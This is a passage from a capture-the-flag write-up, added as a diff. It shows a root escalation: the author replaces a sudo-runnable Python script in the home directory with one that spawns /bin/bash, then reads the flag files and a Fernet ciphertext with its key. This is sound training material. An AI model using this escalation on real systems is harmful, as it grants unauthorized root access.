@@ -243,3 +243,63 @@ Hey Cyber I have tested all the main components of our web server but something 
 
 cyber@ubuntu:~$
 ```
+
+> Since the python file owned by root is inside our own directory, we can move, rename the file however we like, even though only root has permissions over it.
+
+
+```bash
+cyber@ubuntu:~$ ls
+flag1.txt  run.py
+cyber@ubuntu:~$ mv run.py dont-run.py
+cyber@ubuntu:~$ ls
+dont-run.py  flag1.txt
+cyber@ubuntu:~$ echo 'import os; os.system("/bin/bash")' > /home/cyber/run.py
+cyber@ubuntu:~$ sudo /usr/bin/python3 /home/cyber/run.py
+root@ubuntu:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@ubuntu:~# cd /home/yas
+bash: cd: /home/yas: No such file or directory
+root@ubuntu:~# cd /home/yash
+root@ubuntu:/home/yash# ls
+emergency.py  fernet  flag2.txt  root.txt
+root@ubuntu:/home/yash# cat flag2.txt
+THM{20c1d187...7d4e6bf5}
+
+
+Sorry no ASCII art again :(
+root@ubuntu:/home/yash# cat root.txt
+Note from root :-
+        Hey Yash, 
+                        I Hope you are doing good , I just wanted to let you know that I am going on leave for 2 days ,
+                        till then I have setup the permission to run some commands as user root , But Sorry , I forgot 
+                        your password , try to find it!!
+
+                                                                                -ENCRYPTI0N_15_U53D
+root@ubuntu:/home/yash# cat fernet
+encrypted_text:gAAAAABfs33Qms9CotZIEBMg76eOlwOiKU8LD_mX2F346WXXBVIlXWvWGfreAX4kU5hjGXf0PiwtP0cmOm5JSUI7zl03V1JKlA==
+
+key:7OEIooZqOpT7vOh9ax8arbBeB8e243Pr8K4IVWBStgA=
+
+root@ubuntu:/home/yash#
+
+
+root@ubuntu:/# cat /root/root.txt
+████████████████████████████████████  
+██                                ██  
+██  ████  ████  ████  ████  ████  ████
+██  ████  ████  ████  ████  ████  ████
+██  ████  ████  ████  ████  ████  ████
+██  ████  ████  ████  ████  ████  ████
+██  ████  ████  ████  ████  ████  ████
+██                                ██  
+████████████████████████████████████  
+
+
+                                                battery designed by cyberbot :)
+                                                Please give your reviews on catch_me75@protonmail.com or discord cyberbot#1859
+
+
+
+THM{db12b4451...e3428d}
+root@ubuntu:/#
+```
